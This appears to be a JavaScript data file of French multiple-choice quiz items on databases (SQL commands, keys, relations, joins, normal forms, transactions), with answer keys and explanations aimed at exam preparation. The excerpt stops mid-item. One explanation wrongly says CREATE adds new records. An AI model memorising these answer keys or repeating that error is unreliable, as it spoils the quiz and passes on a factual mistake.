// === DONNÉES ===
const questionsData = {
    "Base de données": [
        {
            "theme": "Base de données",
            "question": "Quelle commande SQL permet de récupérer tous les enregistrements d'une table ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "GET * FROM table",
                "SELECT * FROM table",
                "FETCH * FROM table",
                "RETRIEVE * FROM table"
            ],
            "correct": 1,
            "explanation": "SELECT * FROM table est la syntaxe standard SQL pour récupérer tous les enregistrements (toutes les colonnes) d'une table donnée."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une clé primaire en base de données ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un index sur une colonne",
                "Un identifiant unique pour chaque ligne",
                "Une contrainte de validation",
                "Une relation entre tables"
            ],
            "correct": 1,
            "explanation": "Une clé primaire est un identifiant unique pour chaque ligne d'une table, elle ne peut pas être nulle et doit être unique."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une base de données ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un programme qui permet uniquement d'afficher des données à l'écran sans les stocker",
                "Un langage de programmation utilisé pour créer des sites web dynamiques",
                "Un outil qui sert à crypter les connexions entre les applications et les serveurs",
                "Une base de données est un système organisé qui permet de stocker, gérer et récupérer des données de manière efficace"
            ],
            "correct": 3,
            "explanation": "Une base de données est un système organisé qui permet de stocker, gérer et récupérer des données de manière efficace. \nElle est conçue pour faciliter l'accès et la manipulation des informations, garantissant ainsi leur intégrité et leur sécurité.\nLes bases de données peuvent être classées en plusieurs types, notamment les bases de données relationnelles, qui utilisent des tables pour structurer les données, et les bases de données NoSQL, qui offrent une flexibilité accrue pour le stockage de données non structurées."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'un SGBD ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un logiciel utilisé uniquement pour afficher des résultats de recherche sans stocker de données",
                "Un outil graphique servant à représenter les données sous forme de diagrammes UML",
                "Un Système de Gestion de Base de Données (SGBD) est un ensemble de logiciels qui permet de créer, gérer et manipuler des bases de données",
                "Un serveur web permettant d'héberger des applications web"
            ],
            "correct": 2,
            "explanation": "Un Système de Gestion de Base de Données (SGBD) est un ensemble de logiciels qui permet de créer, gérer et manipuler des bases de données.\nIl fournit des outils essentiels pour stocker, récupérer, modifier et supprimer des données, facilitant ainsi l'accès aux informations pour les utilisateurs et les applications.\nLes SGBD garantissent l'intégrité et la sécurité des données en appliquant des règles de validation et en contrôlant les accès.\nIls sont utilisés dans divers domaines, allant des applications web aux systèmes d'entreprise, et sont essentiels pour assurer une gestion efficace des informations.\nParmi les exemples de SGBD populaires, on trouve:\n - MySQL est un SGBD relationnel open source, largement utilisé pour les applications web.\n - PostgreSQL est un SGBD relationnel open source qui supporte des fonctionnalités avancées et est connu pour sa robustesse.\n - Microsoft SQL Server est un SGBD commercial qui offre des outils puissants pour la gestion de bases de données dans les environnements d'entreprise.\n - MongoDB est un SGBD NoSQL qui permet de stocker des données sous forme de documents JSON, offrant une grande flexibilité pour les applications modernes."
        },
        {
            "theme": "Base de données",
            "question": "Quelles sont les principales fonctionnalités d'un SGBD ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Gérer les fichiers de configuration des serveurs web",
                "Un Système de Gestion de Base de Données (SGBD) fournit au moins cinq types de fonctionnalités",
                "Assurer la mise à jour automatique du système d'exploitation",
                "Envoyer des courriels de notification à chaque modification du site web"
            ],
            "correct": 1,
            "explanation": "Un Système de Gestion de Base de Données (SGBD) fournit au moins cinq types de fonctionnalités.\n - Gestion des données : il permet en cela de structurer, organiser et stocker les données de manière efficace, facilitant leur accès et leur manipulation.\n - Manipulation des données (CRUD) : il comprend les opérations du CRUD, c'est-à-dire de création (Create), lecture (Read), mise à jour (Update) et suppression (Delete) des données, essentielles pour la gestion dynamique des informations.\n - Sécurité des données : il assure ainsi la protection des informations sensibles en contrôlant l'accès aux données et en appliquant des règles de sécurité pour prévenir les accès non autorisés.\n - Gestion des transactions : il permet d'exécuter des opérations de manière atomique, garantissant que les transactions sont complètes ou annulées en cas d'erreur, ce qui préserve l'intégrité des données.\n - Création de rapports : il offre enfin des outils pour générer des rapports et des analyses basées sur les données, facilitant la prise de décision et le suivi des performances."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce que le SQL ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un protocole de communication entre serveurs web",
                "Une technologie de virtualisation utilisée pour exécuter des systèmes d’exploitation",
                "Un langage utilisé pour développer des interfaces utilisateur graphiques",
                "Le Structured Query Language (SQL) est un langage standard utilisé pour interagir avec les bases de données relationnelles"
            ],
            "correct": 3,
            "explanation": "Le Structured Query Language (SQL) est un langage standard utilisé pour interagir avec les bases de données relationnelles.\nIl permet aux utilisateurs de créer, lire, mettre à jour et supprimer des données, un ensemble d'opérations couramment désigné sous le terme CRUD (Create, Read, Update, Delete).\n\nSQL offre une syntaxe claire et structurée, facilitant l'écriture de requêtes pour extraire des informations spécifiques, modifier des enregistrements ou gérer la structure des bases de données.\n\nIl comprend également des fonctionnalités avancées telles que la gestion des transactions, les jointures entre tables, et les fonctions d'agrégation, permettant ainsi des analyses complexes et des manipulations de données efficaces.\n\nEn raison de sa puissance et de sa flexibilité, SQL est devenu le langage de référence pour la gestion des données dans de nombreuses applications, allant des systèmes de gestion d'entreprise aux plateformes de données analytiques."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une table dans une base de données ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un fichier temporaire utilisé uniquement pour les calculs intermédiaires",
                "Une structure de code utilisée pour stocker des fonctions dans une base de données",
                "Une table est une collection de données organisées en lignes et en colonnes, qui constitue la structure fondamentale d'une base de données relationnelle",
                "Un composant d'interface graphique utilisé pour afficher des données dans une application web"
            ],
            "correct": 2,
            "explanation": "Une table est une collection de données organisées en lignes et en colonnes, qui constitue la structure fondamentale d'une base de données relationnelle.\nChaque ligne de la table représente un enregistrement , correspondant à une instance unique d'un objet ou d'une entité, tandis que chaque colonne représente un attribut de cet enregistrement, définissant les caractéristiques de l'objet.\nLes tables sont liées entre elles par des relations, ce qui permet de structurer les données de manière logique et de faciliter les opérations de recherche et de manipulation.\nPar exemple, une table 'Clients' peut contenir des informations telles que le nom, l'adresse et le numéro de téléphone, tandis qu'une table 'Commandes' peut enregistrer les achats effectués par ces clients.\nCette organisation permet d'effectuer des requêtes complexes et d'obtenir des informations précises à partir de plusieurs tables."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une requête SQL ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un script JavaScript permettant de manipuler les données dans le navigateur",
                "Une commande système utilisée pour lancer une base de données locale",
                "Une requête SQL est une instruction utilisée pour interroger, manipuler ou gérer des données dans une base de données",
                "Un format de fichier servant à sauvegarder une base de données complète"
            ],
            "correct": 2,
            "explanation": "Une requête SQL est une instruction utilisée pour interroger, manipuler ou gérer des données dans une base de données.\nElle permet aux utilisateurs d'extraire des informations spécifiques, de modifier des enregistrements existants, d'ajouter de nouvelles données ou de supprimer des données non nécessaires.\nLes requêtes SQL peuvent varier en complexité, allant des simples instructions de sélection, comme SELECT , qui récupèrent des données d'une ou plusieurs tables, à des requêtes plus complexes utilisant des jointures, des sous-requêtes et des fonctions d'agrégation.\n\nPar exemple, une requête peut être formulée pour obtenir la liste des clients ayant passé des commandes au cours du dernier mois, en combinant les tables 'Clients' et 'Commandes'.\nGrâce à sa flexibilité et sa puissance, SQL est un outil essentiel pour l'analyse et la gestion des données dans les systèmes de gestion de bases de données ."
        },
        {
            "theme": "Base de données",
            "question": "Quelles sont les principales clauses en SQL ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "On utilise plusieurs clauses en SQL",
                "Une instruction utilisée pour créer une API REST en base de données",
                "Un ensemble de balises HTML servant à formater l'affichage des résultats SQL",
                "Un plugin installé sur un navigateur pour générer des données aléatoires"
            ],
            "correct": 0,
            "explanation": "On utilise plusieurs clauses en SQL. En voici quelques unes.\nLa clause <b>SELECT</b> permet de sélectionner des enregistrements.\n\nCi-dessous, on sélectionne toutes les colonnes de la table utilisateurs.\nSELECT * FROM utilisateurs;\n\nLa clause <b>INSERT</b> permet d'insérer des enregistrements.\nCi-dessous, on insère un nouvel enregistrement dans la table utilisateurs\nINSERT INTO utilisateurs (nom, age)\nVALUES ('Alice', 30);\n\nLa clause <b>UPDATE</b> permet de mettre à jour des enregistrements.\nCi-dessous, on met à jour l'âge de l'utilisateur 'Alice'\nUPDATE utilisateurs\nSET age = 31\nWHERE nom = 'Alice';\n\nLa clause <b>DELETE</b> permet de supprimer des enregistrements.\nCi-dessous, on supprime l'enregistrement de l'utilisateur 'Alice'\nDELETE FROM utilisateurs\nWHERE nom = 'Alice';\n\nLa clause <b>CREATE</b> permet de créer une table.\nCi-dessous, on crée une nouvelle table utilisateurs\n CREATE TABLE utilisateurs (\n  id INT PRIMARY KEY,\n  nom VARCHAR(100),\n  age INT\n);\n\nLa clause <b>DROP</b> permet de supprimer une table.\nCi-dessous, on supprime la table utilisateurs\nDROP TABLE utilisateurs;"
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une clé primaire ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une clé primaire est un champ ou un ensemble de champs dans une table de base de données qui identifie de manière unique chaque enregistrement",
                "Une méthode de chiffrement des données sensibles stockées dans une table",
                "Un type de colonne utilisée uniquement pour les jointures externes",
                "Un identifiant utilisé pour organiser les fichiers sur le disque dur"
            ],
            "correct": 0,
            "explanation": "Une clé primaire est un champ ou un ensemble de champs dans une table de base de données qui identifie de manière unique chaque enregistrement.\nElle garantit que chaque ligne de la table est distincte, empêchant ainsi la duplication des données.\nLa clé primaire joue un rôle essentiel dans la structuration des données et l'établissement de relations entre les tables.\n\nPar exemple, dans une table 'Clients', un champ comme 'ID_Client' pourrait être utilisé comme clé primaire pour identifier chaque client de manière unique. De plus, une clé primaire peut également être utilisée comme clé étrangère dans d'autres tables, permettant ainsi de créer des relations entre les données.\n\nEn résumé, la clé primaire est essentielle pour maintenir l'intégrité des données et faciliter les opérations de recherche et de manipulation dans une base de données."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une clé étrangère ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une clé étrangère est un champ dans une table qui fait référence à la clé primaire d'une autre table, établissant ainsi une relation entre les deux tables",
                "Un mot de passe utilisé pour accéder aux données sensibles d'une table",
                "Une commande SQL permettant de chiffrer les données entre deux tables",
                "Un identifiant interne généré par le SGBD pour trier automatiquement les enregistrements"
            ],
            "correct": 0,
            "explanation": "Une clé étrangère est un champ dans une table qui fait référence à la clé primaire d'une autre table, établissant ainsi une relation entre les deux tables.\nCette relation permet de lier des données connexes et de maintenir l'intégrité référentielle au sein de la base de données.\nPar exemple, dans une base de données de gestion de commandes, une table 'Commandes' peut contenir une clé étrangère appelée 'ID_Client' qui fait référence à la clé primaire 'ID_Client' dans la table 'Clients'.\nCela permet d'associer chaque commande à un client spécifique.\nL'utilisation de clés étrangères permet non seulement d'organiser les données de manière logique, mais aussi de garantir que les relations entre les tables sont cohérentes, empêchant ainsi l'insertion de données orphelines qui ne correspondraient à aucun enregistrement dans la table référencée."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une relation one-to-one ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une relation dans laquelle plusieurs enregistrements d’une table sont liés à plusieurs enregistrements d’une autre table",
                "Une relation one-to-one (ou un-à-un) est une relation qui unit deux tables",
                "Une relation dans laquelle un enregistrement est lié à plusieurs colonnes dans la même table",
                "Une jointure automatique entre deux vues stockées en base de données"
            ],
            "correct": 1,
            "explanation": "Une relation one-to-one (ou un-à-un) est une relation qui unit deux tables.\nUn enregistrement dans une table est alors relié à un seul enregistrement dans une autre table.\n\nExemple :\n\nTable Utilisateur :\n| id | nom    |\n|----|--------|\n| 1  | Alice  |\n| 2  | Bob    |\n\nTable Profil :\n| id | age | id_user |\n|----|-----|---------|\n| 1  | 30  | 1       |\n| 2  | 25  | 2       |"
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une relation one-to-many ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une relation one-to-many (ou un-à-plusieurs) est une relation qui unit deux tables",
                "Une relation où plusieurs bases de données sont interconnectées dans un même serveur",
                "Une relation utilisée exclusivement dans les systèmes NoSQL",
                "Une relation entre deux tables qui empêche la duplication des données"
            ],
            "correct": 0,
            "explanation": "Une relation one-to-many (ou un-à-plusieurs) est une relation qui unit deux tables.\nUn enregistrement dans une table peut être relié à plusieurs enregistrements dans une autre table.\nIl existe à l'inverse une relation many-to-one . Plusieurs enregistrements dans une table sont reliés à un seul enregistrement dans une autre table.\n\nExemple :\n\nTable Auteur :\n| id | prénom  | nom      |\n|----|---------|----------|\n| 1  | Victor  | Hugo     |\n| 2  | Gustave | Flaubert |\n\nTable Livre :\n| id | titre          | id_aut |\n|----|----------------|--------|\n| 1  | Les Misérables | 1      |\n| 2  | Ruy-Blas       | 1      |\n| 3  | Madame Bovary  | 2      |"
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une relation many-to-many ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une table temporaire utilisée pour les opérations de calcul avancées entre deux tables",
                "Une relation entre deux bases de données stockées sur des serveurs différents",
                "Une relation many-to-many (ou plusieurs-à-plusieurs) est une relation qui unit deux tables",
                "Une jointure qui permet d’associer un utilisateur à plusieurs rôles dans une même colonne"
            ],
            "correct": 2,
            "explanation": "Une relation many-to-many (ou plusieurs-à-plusieurs) est une relation qui unit deux tables.\nUn enregistrement dans une table peut être relié à plusieurs enregistrements dans une autre table, et vice versa.\nCela se traduit par une table d'association , où l'on insère pour chaque ligne, la référence à un enregistrement de chaque table.\n\nTable Étudiant :\n| id | nom    |\n|----|--------|\n| 1  | Alice  |\n| 2  | Bob    |\n\nTable Cours :\n| id | titre      |\n|----|------------|\n| 1  | Maths      |\n| 2  | Histoire   |\n\nTable Étudiant_Cours :\n| id_etud | id_cours |\n|---------|----------|\n| 1       | 1        |\n| 1       | 2        |\n| 2       | 1        |"
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une table d'association ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une table utilisée pour générer automatiquement les clés primaires dans une base de données",
                "La table d'association est table utilisée dans le cadre d'une relation many-to-many ",
                "Une table contenant des données de configuration statiques",
                "Une table temporaire générée à chaque exécution d'une requête complexe"
            ],
            "correct": 1,
            "explanation": "La table d'association est table utilisée dans le cadre d'une relation many-to-many.\nElle contient des clefs étrangères qui font référence aux clefs primaires des deux tables impliquées dans la relation.\nDans l'exemple ci-dessus, la table Étudiant_Cours associe les étudiants aux cours qu'ils suivent.\n\nTable Étudiant :\n| id | nom    |\n|----|--------|\n| 1  | Alice  |\n| 2  | Bob    |\n\nTable Cours :\n| id | titre         |\n|----|---------------|\n| 1  | Mathématiques |\n| 2  | Histoire      |\n\nTable Étudiant_Cours :\n| id_etud  | id_cours |\n|----------|----------|\n| 1        | 1        |\n| 1        | 2        |\n| 2        | 1        |"
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une jointure ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une commande SQL qui copie une table entière dans une autre sans condition",
                "Un processus qui permet de fusionner deux serveurs de bases de données",
                "Une jointure (JOIN en SQL) est une opération qui combine des enregistrements de deux ou plusieurs tables en fonction d'une condition liée à une clef",
                "Une fonction automatique qui réindexe les données sur disque pour optimiser les performances"
            ],
            "correct": 2,
            "explanation": "Une jointure (JOIN en SQL) est une opération qui combine des enregistrements de deux ou plusieurs tables en fonction d'une condition liée à une clef.\nVoici les différents types de jointures et leur utilité : \n‑ <b>INNER JOIN</b> retourne les enregistrements lorsque la condition est vraie dans les deux tables. \n‑ <b>LEFT JOIN</b> retourne tous les enregistrements de la table de gauche et les enregistrements correspondants de la table de droite (NULL si pas de correspondance). \n‑ <b>RIGHT JOIN</b> fonctionne de façon symétrique : tous les enregistrements de la table de droite + matches dans la table de gauche. \n‑ <b>FULL JOIN</b> retourne tous les enregistrements des deux tables, avec NULL quand il n’y a pas de correspondance. \n‑ <b>CROSS JOIN</b> retourne le produit cartésien (toutes les combinaisons possibles)."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce que le CRUD dans une base de données ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Une suite de commandes de sauvegarde automatique de la base de données",
                "Une librairie JavaScript pour gérer les interfaces utilisateur",
                "Une API réseau pour synchroniser les bases de données entre plusieurs serveurs",
                "Les opérations CRUD représentent les quatre fonctions fondamentales pour la gestion des données dans une base de données"
            ],
            "correct": 3,
            "explanation": "Les opérations CRUD représentent les quatre fonctions fondamentales pour la gestion des données dans une base de données.\nCes opérations sont essentielles pour créer, lire, mettre à jour et supprimer des enregistrements, et elles sont réalisées à l'aide des clauses SQL suivantes : \n‑ <b>CREATE</b> est utilisée pour ajouter de nouveaux enregistrements dans une table. \n‑ <b>SELECT</b> permet de lire ou d'extraire des données. \n‑ <b>UPDATE</b> est utilisée pour modifier les enregistrements existants. \n‑ <b>DELETE</b> permet de supprimer des enregistrements d'une table. \nCes opérations CRUD sont fondamentales pour toute application utilisant une base de données, car elles permettent de gérer efficacement les données tout au long de leur cycle de vie."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce que la normalisation ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "La normalisation est le processus de structuration d'une base de données afin de réduire la redondance des données et d'améliorer leur intégrité",
                "Une procédure de sauvegarde automatique des données sur des serveurs distants",
                "Un algorithme de tri interne appliqué à chaque requête pour optimiser les résultats",
                "Une méthode de compression des données stockées dans les tables"
            ],
            "correct": 0,
            "explanation": "La normalisation est le processus de structuration d'une base de données afin de réduire la redondance des données et d'améliorer leur intégrité.\nCe processus implique la division des données en tables distinctes et la définition de relations entre elles, ce qui permet d’éviter la duplication d'informations et de garantir que les données restent cohérentes.\nLa normalisation est généralement réalisée en suivant plusieurs formes normales, qui sont des règles définies pour organiser les données.\nPar exemple, la <b>1NF</b> exige que chaque colonne contienne des valeurs atomiques, la <b>2NF</b> vise à éliminer les dépendances partielles, et la <b>3NF</b> interdit les dépendances transitives entre attributs non clés."
        },
        {
            "theme": "Base de données",
            "question": "Quelles sont les trois formes normales en conception de base de données ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Des modalités de chiffrement des données en base de données",
                "Il existe trois formes normales",
                "Un protocole de communication entre bases de données réparties",
                "Une méthode de partitionnement des zones de stockage"
            ],
            "correct": 1,
            "explanation": "Il existe trois formes normales.\nUne table est en première forme normale si tous les attributs contiennent des valeurs atomiques, c’est-à-dire que chaque colonne doit contenir une seule valeur et ne doit pas avoir de valeurs multivaluées ou composites. \nUne table est en deuxième forme normale si elle est en première forme normale et si tous les attributs non clés dépendent entièrement de la clé primaire (aucune dépendance partielle). \nUne table est en troisième forme normale si elle est en deuxième forme normale et si aucun attribut non clé ne dépend transitivement d’un autre attribut non clé (aucune dépendance transitive)."
        },
        {
            "theme": "Base de données",
            "question": "Quelles sont les principales contraintes d'intégrité à appliquer dans une base de données ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Un algorithme de tri des index, une fonction de sauvegarde, une stratégie de cache",
                "Une règle de configuration du serveur, un trigger de rechargement automatique, un plugin SQL",
                "Il existe au moins trois contraintes d'intégrité à appliquer dans une base de données",
                "Un protocole de réplication, un script de nettoyage, une vérification périodique"
            ],
            "correct": 2,
            "explanation": "Il existe au moins trois contraintes d'intégrité à appliquer dans une base de données. \n‑ <b>Intégrité de domaine</b> : garantit que les valeurs des attributs d’une colonne respectent un ensemble de règles définies (type, format, plage, etc.). \n‑ <b>Intégrité d’entité</b> : assure que chaque enregistrement est unique et identifiable, typiquement via une clé primaire. \n‑ <b>Intégrité référentielle</b> : s’assure que les valeurs des clés étrangères correspondent bien à des valeurs existantes dans la clé primaire d’une autre table. \nCes contraintes sont essentielles pour garantir la cohérence, la fiabilité et la validité des données stockées dans la base de données."
        },
        {
            "theme": "Base de données",
            "question": "Comment peut-on limiter les risques d'injections SQL ou de corruption directement au niveau de la base de données ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "En désactivant totalement l'utilisation des clés primaires et étrangères.",
                "En chiffrant l'ensemble de la base de données avec une clé publique symétrique.",
                "En ajoutant des contraintes strictes sur les colonnes (longueur adaptée au type de donnée comme name/email, formats de date stricts, etc.).",
                "En remplaçant toutes les requêtes de sélection par des procédures stockées récursives."
            ],
            "correct": 2,
            "explanation": "En plus des protections applicatives (comme les requêtes préparées), limiter la base de données en définissant des longueurs maximales réalistes (ex: éviter de mettre VARCHAR(255) partout par défaut pour des colonnes 'name' ou 'email'), des formats de date stricts ou des contraintes de vérification limite grandement l'impact des injections SQL ou des corruptions de données."
        },
        {
            "theme": "Base de données",
            "question": "Comment fonctionne une injection SQL ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "En insérant du code malveillant dans les fichiers CSS pour modifier l'apparence des formulaires de saisie.",
                "En insérant du code SQL non filtré dans des champs de saisie utilisateur, qui est ensuite exécuté par la base de données.",
                "En saturant le serveur de requêtes de connexion simultanées pour provoquer un déni de service.",
                "En modifiant directement la structure des tables via le protocole FTP de l'hébergeur."
            ],
            "correct": 1,
            "explanation": "L'injection SQL se produit lorsque des entrées utilisateur non sécurisées ou mal nettoyées sont directement concaténées dans une requête SQL. L'attaquant peut alors insérer ses propres commandes SQL pour contourner l'authentification, lire, modifier ou supprimer des données sensibles."
        },
        {
            "theme": "Base de données",
            "question": "Quel est le but d'un MCD et comment l'utiliser pour créer un MPD ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Un MCD sert uniquement à créer des interfaces graphiques, et le MPD est une variante de design web.",
                "Un MCD est un Modèle Conceptuel de Données qui décrit les entités, leurs attributs et leurs relations, puis permet de dériver un Modèle Physique de Données (MPD) adapté au SGBD.",
                "Un MCD est un schéma de sécurité et le MPD est la version chiffrée des tables.",
                "Le MCD et le MPD sont la même chose, ils ne diffèrent que par le nom."
            ],
            "correct": 1,
            "explanation": "Le MCD (Modèle Conceptuel de Données) permet de représenter le besoin métier de manière abstraite : entités, attributs, relations et cardinalités. Le MPD (Modèle Physique de Données) est la traduction technique de ce modèle pour un SGBD spécifique, avec les tables, les clés primaires, les clés étrangères, les types de colonnes et les contraintes. L'exercice consiste à partir du MCD pour décider des tables, de leurs colonnes et des relations concrètes dans la base de données."
        },
        {
            "theme": "Base de données",
            "question": "Comment présenter votre modèle de données lors d'un entretien ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En listant toutes les colonnes de toutes les tables, dans le désordre",
                "En montrant le schéma (MCD/MPD) et en expliquant les entités principales, leurs attributs clés, les relations et leurs cardinalités, en partant du besoin métier",
                "En expliquant uniquement la manière dont les mots de passe sont stockés",
                "En récitant la documentation du SGBD sans mentionner votre projet"
            ],
            "correct": 1,
            "explanation": "Le jury évalue la capacité à relier un besoin métier à un choix technique. Méthode de présentation :\n1. partir du besoin : 'un client passe des commandes contenant des produits' ;\n2. présenter les entités principales (Client, Commande, Produit) et leur rôle ;\n3. indiquer les clés primaires et les clés étrangères ;\n4. expliquer les relations et leurs cardinalités (1-N, N-N avec table d'association) ;\n5. justifier les choix (normalisation, table d'association).\nS'appuyer sur le schéma (MCD puis MPD) rend le discours clair. Éviter l'énumération exhaustive des colonnes : le jury veut une vision structurée, pas une lecture de table."
        },
        {
            "theme": "Base de données",
            "question": "Comment justifier la création d'une table dans votre modèle de données ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Parce qu'une table supplémentaire améliore toujours les performances de la base",
                "En expliquant l'entité métier qu'elle représente, sa relation avec les autres tables et le besoin fonctionnel qu'elle couvre (ex : une table Commandes car un client peut passer plusieurs commandes)",
                "Parce que le SGBD impose un minimum de dix tables par projet",
                "En créant une table pour chaque colonne de l'application"
            ],
            "correct": 1,
            "explanation": "Chaque table doit correspondre à une entité ou un concept du besoin métier. Pour justifier une table à l'oral :\n1. nommer le besoin fonctionnel : 'les utilisateurs peuvent passer plusieurs commandes, il fallait donc isoler les commandes' ;\n2. montrer le lien avec le dictionnaire de données / le MCD ;\n3. préciser ses attributs clés et sa clé primaire ;\n4. expliquer ses relations (clés étrangères) et leurs cardinalités ;\n5. éventuellement citer la normalisation : éviter de dupliquer les informations du client dans chaque commande.\nUn modèle justifié par le métier est bien reçu ; un modèle subi ('j'ai ajouté une table parce qu'il en fallait une de plus') ne convainc pas."
        },
        {
            "theme": "Base de données",
            "question": "Quelle est la différence entre les relations 1-1, 1-N et N-N ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "1-1, 1-N et N-N sont trois types de clés primaires différents",
                "Ce sont trois syntaxes SQL pour écrire des jointures",
                "1-1 : un enregistrement est lié à un seul autre ; 1-N : un enregistrement peut être lié à plusieurs ; N-N : plusieurs enregistrements peuvent être liés à plusieurs, via une table d'association",
                "Il n'y a pas de différence, seule la vitesse de la base de données change"
            ],
            "correct": 2,
            "explanation": "Les trois cardinalités fondamentales :\n- 1-1 : un enregistrement de A est lié à au plus un enregistrement de B (ex : un utilisateur et son profil) ;\n- 1-N (one-to-many) : un enregistrement de A peut être lié à plusieurs B ; la clé étrangère se place côté N (ex : un auteur écrit plusieurs livres, id_auteur dans Livre) ;\n- N-N (many-to-many) : les enregistrements de A et B peuvent être liés plusieurs à plusieurs ; on crée une table d'association contenant les clés étrangères des deux tables (ex : étudiants et cours, table Etudiant_Cours).\nSavoir traduire les cardinalités du MCD en tables et clés étrangères est une compétence clé pour l'oral : c'est la question 'expliquez la relation entre ces deux tables' reformulée."
        },
        {
            "theme": "Base de données",
            "question": "Écrivez une requête SQL pour récupérer le nom de chaque client avec la date de ses commandes (tables Clients(id, nom) et Commandes(id, date_commande, id_client)).",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "SELECT nom, date_commande FROM Clients JOIN Commandes;",
                "SELECT Clients.nom, Commandes.date_commande FROM Clients INNER JOIN Commandes ON Clients.id = Commandes.id_client;",
                "SELECT * FROM Clients WHERE date_commande = id_client;",
                "INSERT INTO Commandes (nom) SELECT date_commande FROM Clients;"
            ],
            "correct": 1,
            "explanation": "La bonne requête joint les deux tables sur la clé étrangère :\nSELECT Clients.nom, Commandes.date_commande\nFROM Clients\nINNER JOIN Commandes ON Clients.id = Commandes.id_client;\nPoints à expliquer à l'oral :\n- le ON relie la clé primaire de Clients à la clé étrangère de Commandes ;\n- avec des alias c'est plus lisible : SELECT c.nom, co.date_commande FROM Clients c INNER JOIN Commandes co ON c.id = co.id_client ;\n- variante LEFT JOIN pour inclure aussi les clients sans commande (date NULL).\nLes erreurs classiques à éviter : JOIN sans condition ON (produit cartésien), filtre sur des colonnes sans rapport, INSERT là où on attend un SELECT."
        },
        {
            "theme": "Base de données",
            "question": "Quelle est la différence entre INNER JOIN et LEFT JOIN ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "INNER JOIN ne fonctionne que sur les clés primaires, LEFT JOIN uniquement sur les clés étrangères",
                "LEFT JOIN est plus rapide et doit remplacer INNER JOIN partout",
                "INNER JOIN renvoie uniquement les lignes ayant une correspondance dans les deux tables ; LEFT JOIN renvoie toutes les lignes de la table de gauche, avec NULL quand il n'y a pas de correspondance à droite",
                "INNER JOIN trie les résultats, LEFT JOIN ne les trie jamais"
            ],
            "correct": 2,
            "explanation": "Exemple avec Auteur et Livre (un auteur peut ne pas avoir écrit de livre) :\n- INNER JOIN : renvoie uniquement les auteurs ayant au moins un livre ;\n- LEFT JOIN : renvoie tous les auteurs, y compris ceux sans livre - les colonnes de Livre valent alors NULL.\nCas d'usage typique : lister tous les clients, même ceux qui n'ont jamais commandé (LEFT JOIN, puis WHERE Commandes.id IS NULL pour ne garder que ceux-là).\nDe façon symétrique : RIGHT JOIN garde toutes les lignes de la table de droite ; FULL OUTER JOIN garde toutes les lignes des deux tables.\nÀ l'oral, savoir dire quel JOIN sert à quel besoin métier est plus valorisant que réciter la définition."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce qu'une transaction en base de données ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Un groupe d'opérations exécutées comme un tout indivisible : soit toutes s'appliquent (COMMIT), soit aucune ne s'applique (ROLLBACK) en cas d'erreur",
                "Une requête SQL très rapide exécutée entièrement en mémoire",
                "Un e-mail automatique envoyé par le serveur à chaque requête",
                "Une copie de sauvegarde de la base effectuée chaque nuit"
            ],
            "correct": 0,
            "explanation": "Exemple classique : un virement bancaire - le débit du compte A et le crédit du compte B doivent réussir ensemble, sinon l'argent disparaît ou apparaît deux fois.\nSyntaxe : BEGIN TRANSACTION ... COMMIT (valider) ou ROLLBACK (annuler tout).\nEn PHP/PDO :\n$pdo->beginTransaction();\ntry {\n    // débit puis crédit\n    $pdo->commit();\n} catch (Exception $e) {\n    $pdo->rollBack();\n}\nLes transactions garantissent la cohérence en cas d'erreur, de panne ou d'accès concurrent ; leurs garanties formelles sont résumées par l'ACID (atomicité, cohérence, isolation, durabilité)."
        },
        {
            "theme": "Base de données",
            "question": "Qu'est-ce que l'ACID en base de données ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "Un protocole de chiffrement des tables",
                "Un langage concurrent du SQL",
